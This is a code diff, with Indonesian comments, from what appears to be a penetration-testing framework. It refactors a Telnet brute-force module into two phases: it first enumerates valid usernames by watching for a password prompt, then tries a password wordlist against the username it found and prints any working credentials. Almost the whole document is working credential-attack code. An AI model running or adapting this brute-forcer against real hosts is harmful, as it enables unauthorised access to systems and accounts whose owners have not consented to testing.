@@ -62,64 +62,113 @@ def execute(options, net):
 
     smf.printf(f"{CC.CYAN}[*] Starting Telnet Bruteforce =>{CC.RESET} {ip}:23\n")
 
-    # Baca semua password sekali (jika file terlalu besar, pertimbangkan alternatif)
-    # Namun untuk keperluan brute force, biasanya wordlist tidak terlalu besar.
     passwords = list(read_wordlist(password_file))
     if not passwords:
-        smf.printf(f"{CC.RED}[!] Password wordlist is empty or unreadable.{CC.RESET}")
+        smf.printf(
+            f"{CC.RED}[!] Password wordlist is empty or unreadable.{CC.RESET}"
+        )
         return
 
     success = False
+    user = ""
+    con = None
 
-    # Loop setiap username
-    for username in read_wordlist(username_file):
-        if not username:
-            continue
+    try:
+        # =========================
+        # LOOP A — CARI USERNAME
+        # =========================
+        for username in read_wordlist(username_file):
+            if not username:
+                continue
 
-        # Coba semua password untuk username ini
+            con = net.Telnet(ip, port, timeout=1.0)
+
+            if not con.ok:
+                con.close()
+                con = None
+                continue
+
+            # Kirim username, tunggu prompt password
+            _, r = con.send(username, expected=promt_pass)
+
+            if r < 0:
+                smf.printf(
+                    f"{CC.YELLOW}[*] Username: {username} "
+                    f"{SYM_FAILED}{CC.RESET}"
+                )
+                con.close()
+                con = None
+                continue
+
+            # Username valid
+            if r >= 0:
+                user = username
+                smf.printf(
+                    f"[✓] {CC.GREEN}Username found => {user}{CC.RESET}"
+                )
+
+                con.close()
+                con = None
+                break
+    except KeyboardInterrupt:
+        return
+    except Exception as e:
+        smf.printf(f"Error loop username => {e}")
+        return
+    finally:
+        if con:
+            con.close()
+
+
+    # =========================
+    # LOOP B — COBA PASSWORD
+    # =========================
+    if user != "":
         for password in passwords:
             con = None
+
             try:
                 con = net.Telnet(ip, port, timeout=1.0)
-                if con.ok:
-                    # Kirim username, tunggu prompt password
-                    _, r = con.send(username, expected=promt_pass)
-                    if r < 0:
-                        # Username ditolak, tidak perlu lanjut ke password
-                        smf.printf(
-                            f"{CC.YELLOW}[*] Username: {username} {SYM_FAILED}{CC.RESET}"
-                        )
-                        break  # keluar dari loop
+                if not con.ok:
+                    continue
 
-                    # Username diterima, kirim password
-                    _, r = con.send(password, expected=promt_shell)
-                    if r < 0:
-                        user = username
-                        smf.printf(
-                            f"{CC.YELLOW}[*] U:{username} P:{password} {SYM_FAILED}{CC.RESET}"
-                        )
-                        continue
+                # Username yang ditemukan di Loop A
+                _, r = con.send(user, expected=promt_pass)
+                if r < 0:
+                    continue
 
-                    if r >= 0:
-                        # Berhasil login!
-                        smf.printf(
-                            f"{CC.GREEN}[✓7] Bruteforce successful. U={username}:P={password} {SYM_SUCCESS}{CC.RESET}\n"
-                        )
-                        success = True
-                        return  # berhenti total
-                continue
+                # Coba password
+                _, r = con.send(password, expected=promt_shell)
+                if r < 0:
+                    smf.printf(
+                        f"{CC.YELLOW}[*] "
+                        f"U:{user} P:{password} "
+                        f"{SYM_FAILED}{CC.RESET}"
+                    )
+                    continue
+
+                # Login berhasil
+                smf.printf(
+                    f"{CC.GREEN}[✓] Bruteforce successful. "
+                    f"U={user}:P={password} "
+                    f"{SYM_SUCCESS}{CC.RESET}\n"
+                )
+                success = True
+                return
             except KeyboardInterrupt:
-                smf.printf(f"\n{CC.YELLOW}[*] Bruteforce stopped.{CC.RESET}")
+                smf.printf(
+                    f"\n{CC.YELLOW}[*] Bruteforce stopped.{CC.RESET}"
+                )
                 return
             except Exception as e:
-                smf.printf(f"Error while trying {username}:{password}", e)
+                smf.printf(
+                    f"Error while trying {user}:{password}: {e}"
+                )
                 return
             finally:
                 if con:
                     con.close()
-
-        # Jika semua password gagal untuk username ini, lanjut ke username berikutnya
-
+                    
     if not success:
         smf.printf(
             f"{CC.YELLOW}[!] Bruteforce failed, no valid combination found.{CC.RESET}"
